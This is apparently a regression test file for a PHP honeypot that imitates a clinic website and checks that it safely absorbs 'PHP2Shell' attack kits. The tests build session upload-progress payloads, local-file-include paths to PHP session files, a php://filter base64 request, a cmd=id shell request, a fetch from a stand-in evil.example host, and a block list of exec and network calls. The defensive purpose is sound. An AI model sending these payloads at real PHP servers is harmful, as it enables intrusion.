"""Kit-wall regression tests (2026-11-07): known PHP2Shell kit shapes must
clear S1/S2 on the clinic persona without any real include/exec/outbound.

Local only — no network beyond a loopback socketpair for the sensor
partial-body reader.
"""
from __future__ import print_function

import base64
import os
import socket
import sys
import tempfile
import threading

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from anglerfish import php2shell_chain as c
from anglerfish import phpapp
from anglerfish import sensor


def check(name, cond, detail=""):
    if cond:
        print("  OK", name)
        return 0
    print("  FAIL", name, detail)
    return 1


def _t(b):
    if isinstance(b, (bytes, bytearray)):
        return bytes(b).decode("latin-1", "replace")
    return b or ""


def _mp(progress, sid_field=False, extra=b""):
    bnd = b"----kitbnd123"
    parts = [
        b"--" + bnd + b"\r\n",
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
        b"\r\n\r\n" + progress + b"\r\n",
        b"--" + bnd + b"\r\n",
        b'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        b"Content-Type: text/plain\r\n\r\n" + (b"A" * 2048) + extra + b"\r\n",
        b"--" + bnd + b"--\r\n",
    ]
    return b"".join(parts)


HDR = "Content-Type: multipart/form-data; boundary=----kitbnd123\r\n"


def _world(sid, body, declared=None):
    cookies = "PHPSESSID=" + sid if sid else ""
    p2s = phpapp.inspect_php2shell(
        HDR, body, declared_length=declared or len(body), cookies=cookies)
    return {
        "company": "Larkfield Health", "domain": "clinic.example",
        "http_cookie": cookies, "php2shell": p2s,
        "http_declared_length": declared or len(body),
        "http_headers_prefix": HDR,
    }, p2s


def _get_world(sid):
    cookies = "PHPSESSID=" + sid if sid else ""
    p2s = phpapp.inspect_php2shell("", b"", cookies=cookies)
    return {"company": "Larkfield Health", "domain": "clinic.example",
            "http_cookie": cookies, "php2shell": p2s}


def main():
    failures = 0
    os.environ["ANGLERFISH_PHP2SHELL_FULLCHAIN"] = "1"
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "0"
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_LEAK", None)  # default ON
    os.environ.pop("ANGLERFISH_PHP2SHELL_LEAK_PLAIN_TOKEN", None)
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_PERSIST", None)
    os.environ["ANGLERFISH_PHP2SHELL_SAMPLE_DIR"] = tempfile.mkdtemp(
        prefix="p2s-kit-")
    c.reset_state_for_tests()

    # --- 1) today's kit: 32× POST / with progress=pwn, then include ---------
    sid = "attacksessionid0001"
    body = _mp(b"pwn")
    r = None
    for _ in range(32):
        w, p2s = _world(sid, body)
        r = phpapp.handle("/", method="POST", body=body, world=w)
    failures += check("today_post_root_s1_softfail",
                      r and r[2] == 200 and "progress=pwn" in _t(r[0])
                      and w.get("php2shell_stage") == "s1_upload",
                      str(r[2] if r else None))
    st = c.get_state(sid)
    failures += check("today_state_saved", st and st.get("stage") == "s1_done")
    failures += check("today_progress_anywhere_flag",
                      (w.get("php2shell_research") or {}).get(
                          "s1_progress_anywhere") == "/")
    # plain token → no junk cookie swap (cookie jar clients stay sane)
    ck = "".join(h for h in r[4] if h.startswith("Set-Cookie"))
    failures += check("today_plain_token_no_leak_swap",
                      "PHPSESSID=%s;" % sid in ck and len(ck) < 200
                      and (w.get("php2shell_research") or {}).get(
                          "fake_leak_skipped_plain_token"), ck[:120])
    for inc in ("page=/var/lib/php/sessions/sess_" + sid,
                "page=../../../../var/lib/php/sessions/sess_" + sid,
                "file=/tmp/sess_" + sid):
        g = phpapp.handle("/?" + inc, method="GET", world=_get_world(sid))
        failures += check("today_include_s2[%s]" % inc[:40],
                          g and g[2] == 200 and "upload_progress_pwn|" in _t(g[0])
                          and _t(g[0]).count("pwn") >= 2,
                          str(g[2] if g else None))
        failures += check("today_include_no_exec_tells[%s]" % inc[:20],
                          g and "uid=" not in _t(g[0]) and "<?php" not in _t(g[0]))

    # --- clinic homepage intact -------------------------------------------
    h = phpapp.handle("/", method="GET", world=_get_world(sid))
    failures += check("get_root_clinic_home",
                      h and h[2] == 200 and "Larkfield" in _t(h[0])
                      and "Upload failed" not in _t(h[0]))
    plain_post = b"q=hello"
    wpp = {"company": "Larkfield Health", "domain": "clinic.example",
           "php2shell": phpapp.inspect_php2shell(
               "Content-Type: application/x-www-form-urlencoded\r\n",
               plain_post)}
    hp = phpapp.handle("/", method="POST", body=plain_post, world=wpp)
    failures += check("post_root_no_progress_home",
                      hp and hp[2] == 200 and "Upload failed" not in _t(hp[0]))
    for q in ("lang=en", "view=list", "template=default", "f=1"):
        hq = phpapp.handle("/?" + q, method="GET", world=_get_world(sid))
        failures += check("benign_extra_param_not_lfi[%s]" % q,
                          hq and hq[2] == 200 and "Not Found" not in _t(hq[0]))

    # --- progress-anywhere on other primes --------------------------------
    for pth in ("/login.php", "/test.php", "/search.php"):
        c.reset_state_for_tests()
        sid2 = "anywhere" + pth.strip("/").replace(".", "")
        b2 = _mp(b"ZZmark")
        w2, _ = _world(sid2, b2)
        r2 = phpapp.handle(pth, method="POST", body=b2, world=w2)
        failures += check("progress_anywhere_s1[%s]" % pth,
                          r2 and r2[2] == 200
                          and w2.get("php2shell_stage") == "s1_upload"
                          and c.get_state(sid2) is not None,
                          str((r2[2] if r2 else None, w2.get("php2shell_stage"))))

    # --- 2) one-request orange racer --------------------------------------
    for key in ("0", "inc", "template", "view", "lang", "f"):
        c.reset_state_for_tests()
        sid3 = "orangeracer" + key + "x"
        b3 = _mp(b"orangeSIG")
        w3, _ = _world(sid3, b3)
        r3 = phpapp.handle(
            "/test.php?%s=/var/lib/php/sessions/sess_%s" % (key, sid3),
            method="POST", body=b3, world=w3)
        failures += check("one_request_race_s2[%s]" % key,
                          r3 and r3[2] == 200
                          and "upload_progress_orangeSIG|" in _t(r3[0])
                          and (w3.get("php2shell_research") or {}).get(
                              "s1_one_request_race"),
                          str((r3[2] if r3 else None, w3.get("php2shell_stage"))))
    # racer with mismatched sid still 404 (no arbitrary include)
    c.reset_state_for_tests()
    b3 = _mp(b"orangeSIG")
    w3, _ = _world("racerA1234", b3)
    r3b = phpapp.handle("/test.php?0=/var/lib/php/sessions/sess_OTHER999",
                        method="POST", body=b3, world=w3)
    failures += check("one_request_race_mismatch_404", r3b and r3b[2] == 404)
    failures += check("racer_mismatch_still_noted_s1",
                      c.get_state("racer A1234".replace(" ", "")) is not None)
    # php-echo sig progress: blob never carries a php open tag
    c.reset_state_for_tests()
    b4 = _mp(b'<?php echo "KITSIG".md5(1); ?>')
    w4, _ = _world("phpsigsid0001", b4)
    r4 = phpapp.handle("/test.php?0=/tmp/sess_phpsigsid0001",
                       method="POST", body=b4, world=w4)
    failures += check("php_sig_stripped",
                      r4 and r4[2] == 200 and "<?php" not in _t(r4[0])
                      and "upload_progress_" in _t(r4[0]),
                      _t(r4[0])[:120] if r4 else "")
    failures += check("php_sig_not_evaluated",
                      r4 and "c4ca4238a0b923820dcc509a6f75849b" not in _t(r4[0]))

    # --- 3) partial / idle body via real sensor reader --------------------
    a, b = socket.socketpair()
    prefix = _mp(b"slowkit")[:400]  # progress value + start of file part only
    head = (b"POST /index.php?x=1 HTTP/1.1\r\nHost: clinic\r\n"
            b"Content-Type: multipart/form-data; boundary=----kitbnd123\r\n"
            b"Cookie: PHPSESSID=slowkitsid0001\r\n"
            b"Content-Length: 33000000\r\n\r\n")
    def _feed():
        try:
            b.sendall(head + prefix)
        except OSError:
            pass
    threading.Thread(target=_feed, daemon=True).start()
    first = a.recv(64)
    hb = sensor._http_head_and_body(a, first)
    a.close(); b.close()
    h_raw, body_p, declared, _dr, _cap, meta = hb
    failures += check("partial_reader_worker_hold",
                      meta.get("worker_hold")
                      and meta.get("worker_hold_reason") == "post_idle_timeout",
                      str(meta))
    c.reset_state_for_tests()
    p2s_p = phpapp.inspect_php2shell(
        h_raw.decode("latin-1"), body_p, declared_length=declared,
        cookies="PHPSESSID=slowkitsid0001")
    # mirror sensor.py worker_hold wiring
    p2s_p["hit"] = True
    p2s_p["worker_hold"] = True
    p2s_p["worker_hold_reason"] = meta.get("worker_hold_reason")
    wp = {"company": "Larkfield Health", "php2shell": p2s_p,
          "http_cookie": "PHPSESSID=slowkitsid0001",
          "http_declared_length": declared}
    rp = phpapp.handle("/index.php", method="POST", body=body_p, world=wp)
    failures += check("partial_body_s1_noted",
                      rp and rp[2] == 200
                      and (wp.get("php2shell_research") or {}).get(
                          "s1_partial_body")
                      and (c.get_state("slowkitsid0001") or {}).get(
                          "s1_partial_body"),
                      str(wp.get("php2shell_research", {}).get("s1_partial_reason")))
    gp = phpapp.handle("/index.php?page=/var/lib/php/sessions/sess_slowkitsid0001",
                       method="GET", world=_get_world("slowkitsid0001"))
    failures += check("partial_body_then_include_s2",
                      gp and gp[2] == 200 and "upload_progress_slowkit|" in _t(gp[0]))
    failures += check("partial_prefix_capped",
                      len(body_p) <= phpapp.BODY_PREFIX_CAP)

    # --- 4) race flake only on first S2 attempt; TTL 15 min ---------------
    os.environ.pop("ANGLERFISH_PHP2SHELL_NO_FLAKE", None)
    old_pct = c.RACE_FLAKE_PCT
    c.RACE_FLAKE_PCT = 100
    c.reset_state_for_tests()
    c.note_s1("flakesid0001", progress_name="FLK", body_prefix=b"FLK",
              declared_length=100)
    res = [c.route("/tmp/sess_flakesid0001", sessid="flakesid0001")[5]
           for _ in range(4)]
    failures += check("flake_first_only",
                      res[0] == "s2_race_flake"
                      and all(x == "s2_marker_reflect" for x in res[1:]), str(res))
    c.RACE_FLAKE_PCT = old_pct
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    failures += check("ttl_15min", c.STATE_TTL_SEC == 900)

    # --- 5) leak cookie map: B1-style kit gets junk, cookie-jar follow works -
    c.reset_state_for_tests()
    orig = "b1leakorigsid0001"
    b5 = _mp(b"")  # empty progress value → not a plain token → B1 leak fires
    w5, _ = _world(orig, b5, declared=5000000)
    r5 = phpapp.handle("/upload.php", method="POST", body=b5, world=w5)
    ck5 = "".join(h for h in r5[4] if h.startswith("Set-Cookie"))
    junk = ck5.split("PHPSESSID=", 1)[-1].split(";", 1)[0]
    failures += check("b1_leak_fires_non_plain",
                      (w5.get("php2shell_research") or {}).get("fake_leak_cookie")
                      and len(junk) >= 8 * 1024, "len=%d" % len(junk))
    # client follows Set-Cookie (full junk), sensor-head-cap truncation (~10KiB),
    # and phpapp 128-char echo truncation — all must map back to orig sid
    for label, cv in (("full", junk), ("head_cap", junk[:10000]),
                      ("echo128", junk[:128])):
        g5 = phpapp.handle(
            "/index.php?page=/var/lib/php/sessions/sess_" + orig,
            method="GET", world=_get_world(cv))
        failures += check("leak_map_include_resolves[%s]" % label,
                          g5 and g5[2] == 200 and "upload_progress_" in _t(g5[0]),
                          str(g5[2] if g5 else None))
    failures += check("leak_resolve_helper",
                      c.resolve_sessid(junk[:64]) == orig
                      and c.resolve_sessid("unrelatedsid") == "unrelatedsid")
    os.environ["ANGLERFISH_PHP2SHELL_LEAK_PLAIN_TOKEN"] = "1"
    c.reset_state_for_tests()
    w6, _ = _world("plainoptin0001", _mp(b"pwn"), declared=5000000)
    phpapp.handle("/upload.php", method="POST", body=_mp(b"pwn"), world=w6)
    failures += check("plain_token_leak_opt_in",
                      (w6.get("php2shell_research") or {}).get("fake_leak_cookie"))
    os.environ.pop("ANGLERFISH_PHP2SHELL_LEAK_PLAIN_TOKEN", None)

    # --- 6) php://filter base64 (synthetic) --------------------------------
    c.reset_state_for_tests()
    c.note_s1("filtersid0001", progress_name="pwn", body_prefix=b"pwn",
              declared_length=100)
    g6 = phpapp.handle(
        "/index.php?page=php://filter/convert.base64-encode/resource="
        "/var/lib/php/sessions/sess_filtersid0001",
        method="GET", world=_get_world("filtersid0001"))
    dec = ""
    try:
        dec = base64.b64decode(_t(g6[0]).strip()).decode("latin-1")
    except Exception:
        pass
    failures += check("php_filter_b64_decodes_to_blob",
                      g6 and g6[2] == 200 and dec.startswith("upload_progress_pwn|"),
                      _t(g6[0])[:60] if g6 else "")

    # --- hard stops still hold --------------------------------------------
    src = open(c.__file__, encoding="utf-8").read()
    for bad in ("urlopen", "urllib.request", "http.client", "subprocess",
                "os.system", "os.popen", "eval(", "exec("):
        failures += check("hardstop_no_%s" % bad.strip("(").replace(".", "_"),
                          bad not in src)
    # S3/S4 walls unchanged: no state → shell 404; url= → reject, not fetched
    c.reset_state_for_tests()
    r7 = c.route("/uploads/shell.php", query="cmd=id", sessid="nostate0001")
    failures += check("s3_still_gated", r7 and r7[2] == 404)
    r8 = c.route("/upload.php", query="url=http://evil.example/x.sh",
                 sessid="nostate0001")
    failures += check("s4_still_reject_not_fetched",
                      r8 and r8[5] == "s4_callback_logged_not_fetched")

    print()
    if failures:
        print("%d FAILURES" % failures)
        return 1
    print("all php2shell kit-wall checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
